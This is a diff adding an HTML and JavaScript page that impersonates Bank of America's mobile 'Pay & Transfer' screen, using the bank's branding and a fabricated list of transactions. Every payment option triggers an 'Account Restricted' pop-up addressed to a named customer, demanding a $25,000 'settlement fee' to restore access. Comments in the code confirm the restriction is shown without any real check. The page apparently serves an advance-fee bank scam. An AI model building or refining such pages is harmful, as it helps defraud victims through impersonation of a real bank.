@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Bank of America - Pay & Transfer</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-container dashboard-mode">
+        <!-- Top Navigation -->
+        <header class="top-nav">
+            <div class="nav-left">
+                <div class="nav-item" style="margin-left: 0;">
+                    <i class="fas fa-bars nav-icon"></i>
+                    <span class="nav-text">Menu</span>
+                </div>
+            </div>
+            <div class="nav-right">
+                <div class="nav-item">
+                    <i class="far fa-envelope nav-icon"></i>
+                    <span class="nav-text">Inbox</span>
+                </div>
+                <div class="nav-item">
+                    <i class="fas fa-shopping-cart nav-icon"></i>
+                    <span class="nav-text">Products</span>
+                </div>
+                <div class="nav-item" id="logout-btn">
+                    <i class="fas fa-sign-out-alt nav-icon"></i>
+                    <span class="nav-text">Log Out</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Tabs -->
+        <div class="tabs">
+            <div class="tab" onclick="window.location.href='dashboard.html'">Accounts</div>
+            <div class="tab active">Pay & Transfer</div>
+        </div>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <h1 class="page-title">Pay & Transfer</h1>
+            
+            <!-- Pay Options Grid -->
+            <div class="pay-options-grid">
+                <div class="pay-option-card" id="zelleOption">
+                    <div class="pay-icon-container zelle-bg">
+                        <svg viewBox="0 0 100 40" style="width: 50px; height: auto; fill: white;">
+                            <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-weight="bold" font-size="28" fill="white" letter-spacing="-1">Zelle</text>
+                            <line x1="50" y1="5" x2="50" y2="35" stroke="white" stroke-width="2" transform="rotate(15 50 20)" style="opacity: 0.3;" />
+                        </svg>
+                    </div>
+                    <span class="pay-option-text">Send money with Zelle®</span>
+                </div>
+                <div class="pay-option-card" id="transferOption">
+                    <div class="pay-icon-container blue-bg">
+                        <i class="fas fa-exchange-alt"></i>
+                    </div>
+                    <span class="pay-option-text">Transfer between accounts</span>
+                </div>
+                <div class="pay-option-card" id="billPayOption">
+                    <div class="pay-icon-container red-bg">
+                        <i class="fas fa-file-invoice-dollar"></i>
+                    </div>
+                    <span class="pay-option-text">Bill Pay</span>
+                </div>
+                <div class="pay-option-card" id="wireOption">
+                    <div class="pay-icon-container gray-bg">
+                        <i class="fas fa-globe"></i>
+                    </div>
+                    <span class="pay-option-text">Wire Money</span>
+                </div>
+            </div>
+
+            <!-- Recent Transactions Section -->
+            <div class="recent-transactions-section">
+                <h3>Recent Transactions</h3>
+                <div class="transaction-list" id="transaction-list-container">
+                    <!-- Transactions will be populated by JavaScript -->
+                </div>
+            </div>
+        </main>
+
+        <!-- Bottom Navigation -->
+        <nav class="bottom-nav">
+            <div class="nav-item" id="accounts-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-dollar-sign"></i>
+                </div>
+                <span>Accounts</span>
+            </div>
+            <div class="nav-item active">
+                <div class="icon-circle">
+                    <i class="fas fa-exchange-alt"></i>
+                </div>
+                <span>Pay & Transfer</span>
+            </div>
+            <div class="nav-item" id="deposit-checks-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-camera"></i>
+                </div>
+                <span>Deposit Checks</span>
+            </div>
+            <div class="nav-item" id="invest-tab">
+                <div class="icon-circle">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+                <span>Invest</span>
+            </div>
+        </nav>
+    </div>
+
+    <!-- RESTRICTION MODAL - NO VERIFICATION CODE, JUST RESTRICTION MESSAGE -->
+    <div id="restrictionModal" class="modal-overlay">
+        <div class="security-modal-content">
+            <div class="security-modal-header">
+                <img src="logo.svg" alt="Bank of America Logo" class="security-logo-icon">
+                <span class="security-logo-text">BANK OF AMERICA</span>
+            </div>
+            <div class="security-body">
+                <div class="security-icon-lock" style="color: #E31837;">
+                    <i class="fas fa-exclamation-triangle"></i>
+                </div>
+                <div class="security-title">Account Restricted</div>
+                <div class="security-text" style="text-align: left;">
+                    Dear Megan Woods,<br><br>
+                    Due to unresolved circumstances with a third party.<br><br>
+                    A settlement fee of <strong style="color: #E31837;">$25,000.00</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.
+                </div>
+                <button id="closeRestrictionBtn" class="security-btn">I Understand</button>
+                <div class="security-footer-link" id="contactSupportLink">Contact Support</div>
+            </div>
+        </div>
+    </div>
+
+    <script src="auth.js"></script>
+    <script>
+        BoAAuth.requireAuth();
+
+        // ========================
+        // LOGOUT & NAVIGATION
+        // ========================
+        document.getElementById('logout-btn').addEventListener('click', function() {
+            BoAAuth.logout();
+            window.location.href = 'index.html';
+        });
+        
+        document.getElementById('accounts-tab').addEventListener('click', function() {
+            window.location.href = 'dashboard.html';
+        });
+
+        document.getElementById('deposit-checks-tab').addEventListener('click', function() {
+            window.location.href = 'deposit_checks.html';
+        });
+
+        document.getElementById('invest-tab').addEventListener('click', function() {
+            window.location.href = 'invest.html';
+        });
+
+        // ========================
+        // TRANSACTION GENERATION (realistic history)
+        // ========================
+        function generateTransactions() {
+            const container = document.getElementById('transaction-list-container');
+            const months = ["DEC", "NOV", "OCT", "SEP", "AUG", "JUL", "JUN", "MAY", "APR", "MAR", "FEB", "JAN"];
+            let currentDate = new Date(2025, 11, 15);
+
+            const history = [
+                { desc: "Dominion Energy", sub: "Bill Pay", amount: 20000, type: "negative" },
+                { desc: "Delta Air Lines", sub: "Travel", amount: 18450, type: "negative" },
+                { desc: "Dominion Energy", sub: "Bill Pay", amount: 15000, type: "negative" },
+                { desc: "Marriott Hotels", sub: "Lodging", amount: 12780, type: "negative" },
+                { desc: "ACH Deposit - EMPLOYER PAYROLL", sub: "Direct Deposit", amount: 19500, type: "positive" },
+                { desc: "Dominion Energy", sub: "Bill Pay", amount: 10000, type: "negative" },
+                { desc: "Hertz Rent A Car", sub: "Travel", amount: 8920, type: "negative" },
+                { desc: "Whole Foods Market", sub: "Groceries", amount: 6240, type: "negative" },
+                { desc: "Dominion Energy", sub: "Bill Pay", amount: 5000, type: "negative" },
+                { desc: "UnitedHealthcare", sub: "Medical Insurance", amount: 17850, type: "negative" },
+                { desc: "Hilton Hotels", sub: "Travel", amount: 14320, type: "negative" },
+                { desc: "State Farm Insurance", sub: "Auto Insurance", amount: 9650, type: "negative" },
+                { desc: "Costco Wholesale", sub: "Shopping", amount: 7310, type: "negative" },
+                { desc: "IRS TAX REFUND", sub: "Government Payment", amount: 16200, type: "positive" },
+                { desc: "Southwest Airlines", sub: "Travel", amount: 11840, type: "negative" },
+                { desc: "Lowe's Home Improvement", sub: "Home & Garden", amount: 8540, type: "negative" },
+                { desc: "CVS Pharmacy", sub: "Health & Wellness", amount: 5120, type: "negative" },
+                { desc: "Shell Oil", sub: "Gas & Fuel", amount: 6890, type: "negative" },
+                { desc: "Verizon Wireless", sub: "Phone Bill", amount: 5450, type: "negative" },
+                { desc: "Amazon.com", sub: "Online Purchase", amount: 9230, type: "negative" },
+                { desc: "Mortgage Payment", sub: "Home Loan", amount: 19800, type: "negative" },
+                { desc: "Fidelity 401K CONTRIBUTION", sub: "Retirement", amount: 7500, type: "negative" },
+                { desc: "ACH Deposit - BONUS PAY", sub: "Direct Deposit", amount: 12000, type: "positive" },
+                { desc: "Trader Joe's", sub: "Groceries", amount: 5780, type: "negative" },
+                { desc: "Geico Insurance", sub: "Insurance", amount: 10450, type: "negative" }
+            ];
+
+            const transactions = history.map((tx) => {
+                currentDate.setDate(currentDate.getDate() - 1);
+                return {
+                    month: months[currentDate.getMonth()],
+                    day: currentDate.getDate(),
+                    year: currentDate.getFullYear(),
+                    desc: tx.desc,
+                    sub: tx.sub,
+                    amount: tx.amount,
+                    type: tx.type
+                };
+            });
+
+            const fragment = document.createDocumentFragment();
+            transactions.forEach(tx => {
+                const item = document.createElement('div');
+                item.className = 'transaction-item';
+                const formattedAmount = new Intl.NumberFormat('en-US', {
+                    style: 'currency',
+                    currency: 'USD'
+                }).format(Math.abs(tx.amount));
+                const sign = tx.type === 'positive' ? '+' : '-';
+                item.innerHTML = `
+                    <div class="transaction-date">
+                        <span class="month">${tx.month}</span>
+                        <span class="day">${tx.day}</span>
+                        <span class="year">${tx.year}</span>
+                    </div>
+                    <div class="transaction-details">
+                        <p class="transaction-desc">${tx.desc}</p>
+                        <p class="transaction-sub">${tx.sub}</p>
+                    </div>
+                    <div class="transaction-amount ${tx.type}">${sign}${formattedAmount}</div>
+                `;
+                fragment.appendChild(item);
+            });
+            container.appendChild(fragment);
+        }
+
+        // ========================
+        // RESTRICTION MODAL - NO VERIFICATION CODE, JUST SHOW RESTRICTION MESSAGE
+        // ========================
+        const restrictionModal = document.getElementById('restrictionModal');
+        const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
+        const contactSupportLink = document.getElementById('contactSupportLink');
+        
+        // Get all pay option cards
+        const zelleOption = document.getElementById('zelleOption');
+        const transferOption = document.getElementById('transferOption');
+        const billPayOption = document.getElementById('billPayOption');
+        const wireOption = document.getElementById('wireOption');
+        
+        // Function to show restriction modal immediately - NO CODE VERIFICATION
+        function showRestrictionModal() {
+            restrictionModal.style.display = 'flex';
+        }
+
+        // Add click listeners to all pay options - directly show restriction without any verification
+        if (zelleOption) {
+            zelleOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (transferOption) {
+            transferOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (billPayOption) {
+            billPayOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+        
+        if (wireOption) {
+            wireOption.addEventListener('click', function(e) {
+                e.preventDefault();
+                showRestrictionModal();
+            });
+        }
+
+        // Close modal on "I Understand"
+        if (closeRestrictionBtn) {
+            closeRestrictionBtn.addEventListener('click', function() {
+                restrictionModal.style.display = 'none';
+            });
+        }
+
+        // Contact Support - closes modal
+        if (contactSupportLink) {
+            contactSupportLink.addEventListener('click', function() {
+                restrictionModal.style.display = 'none';
+            });
+        }
+
+        // Click outside modal to close
+        restrictionModal.addEventListener('click', function(e) {
+            if (e.target === restrictionModal) {
+                restrictionModal.style.display = 'none';
+            }
+        });
+
+        // Initialize on page load
+        window.onload = function() {
+            generateTransactions();
+            // Make sure restriction modal is hidden on load
+            if (restrictionModal) {
+                restrictionModal.style.display = 'none';
+            }
+        };
+    </script>
+</body>
+</html>
